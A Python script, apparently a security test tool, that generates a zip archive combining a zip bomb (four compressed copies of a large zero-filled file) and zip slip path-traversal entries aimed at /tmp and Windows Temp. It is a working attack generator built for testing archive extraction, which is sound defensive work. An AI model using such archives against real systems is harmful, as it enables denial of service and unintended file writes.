"""Code to create a simple zip bomb in python for test purposes"""
import zipfile
import os
import sys

ZIPBOMB = "zipbombfile.txt"
ZIPTRAVERSAL = "zipslipfile.txt"
ZIPFILENAME = "zip_attack_test.zip"

# preparing zip bomb file
with open(ZIPBOMB, 'w', encoding="utf-8") as filehandle:
    for line in range(1023 * 128):
        sys.stdout.write(f"Preparing bombfile by writing lines of zero's to {ZIPBOMB}: {line}\r")
        sys.stdout.flush()
        filehandle.write("0" * 1023 + "\n")
    filehandle.close()
filesize = os.path.getsize(ZIPBOMB) / float(1024 * 1024)
print(f"\n{ZIPBOMB} : {filesize:.2f} MB")

# preparing zip slip file
with open(ZIPTRAVERSAL, 'a', encoding="utf-8") as filehandle:
    filehandle.write("Testfile, filename shows if its good or evil")
    filehandle.close()
traversal_files = ["zip_normal.txt"]
traversal_files.append("../" * 39 + "tmp/zip_slip_posix.txt")
traversal_files.append(r"..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\Temp\zip_slip_windows.txt")

with zipfile.ZipFile(ZIPFILENAME, mode="w", compression=zipfile.ZIP_DEFLATED) as zf:
    for clone in range(4):
        print(f"Adding {ZIPBOMB + str(clone)} as {ZIPFILENAME}")
        zf.write(ZIPBOMB, ZIPBOMB + str(clone))
    print("Adding multiple zip slip file's:")
    for item in traversal_files:
        print(f"Adding traversal attack file TRAVERSAL_FILE as {item}")
        zf.write(ZIPTRAVERSAL, item)

print(f"Removing temporary files: {ZIPBOMB}, {ZIPTRAVERSAL}")
os.remove(ZIPBOMB)
os.remove(ZIPTRAVERSAL)

filesize = os.path.getsize(ZIPFILENAME) / float(1024 * 1024)
print(f"\n{ZIPFILENAME} : {filesize:.2f} MB")
